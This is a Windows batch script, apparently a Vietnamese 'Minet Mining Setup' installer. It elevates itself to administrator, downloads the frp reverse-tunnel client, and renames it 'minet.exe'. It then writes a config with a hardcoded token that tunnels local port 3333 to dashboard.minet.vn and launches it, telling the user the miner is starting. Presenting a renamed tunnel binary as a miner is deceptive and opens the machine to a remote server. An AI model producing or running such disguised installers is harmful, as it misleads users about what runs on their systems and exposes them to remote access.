@echo off
setlocal enabledelayedexpansion

:: 1. Quyen Admin
net session >nul 2>&1
if errorlevel 1 (
    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
    exit /b
)

set "BU=https://dashboard.minet.vn"
set "WD=C:\MinetMining"

echo.
echo ===== Minet Mining Setup (Fixed Path) =====
echo.

:: 2. Nhap Email
set /p EM="Email: "
if "!EM!"=="" (echo Email required. & pause & exit /b 1)

echo [INFO] Dang chuan bi thu muc...
if not exist "%WD%" mkdir "%WD%"
cd /d "%WD%"

:: 3. Lay IP va Encode
for /f "delims=" %%I in ('curl -sf https://api.ipify.org') do set CI=%%I
set EE=!EM:@=%%40!
set EE=!EE:+=%%2B!
set EI=!CI::=%%3A!

:: 4. Tai file tu GitHub (Dung TLS 1.2 de tranh loi ket noi)
echo [INFO] Dang tai tunnel client...
powershell -Command "^
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; ^
    Invoke-WebRequest -Uri 'https://github.com/fatedier/frp/releases/download/v0.51.3/frp_0.51.3_windows_amd64.zip' -OutFile 'f.zip'; ^
    tar -xf f.zip; ^
    $path = (Get-ChildItem -Recurse -Filter 'frpc.exe').FullName; ^
    if ($path) { Copy-Item $path -Destination '.\minet.exe' -Force } else { Write-Error 'Khong tim thay frpc.exe' }; ^
    Remove-Item f.zip; ^
    Get-ChildItem -Directory -Filter 'frp_*' | Remove-Item -Recurse -Force; ^
"

:: 5. Kiem tra xem file minet.exe da ton tai chua
if not exist "minet.exe" (
    echo [ERROR] Tai file that bai hoặc bị Antivirus xoa.
    pause
    exit /b 1
)

:: 6. Tao file config
(
echo [common]
echo server_addr = dashboard.minet.vn
echo server_port = 7000
echo token = minet2024
echo.
echo [mine-!EM!]
echo type = tcp
echo local_ip = 127.0.0.1
echo local_port = 3333
echo remote_port = 0
) > config.ini

echo [DONE] Setup thanh cong!
echo Dang khoi chay miner...
start minet.exe -c config.ini
pause
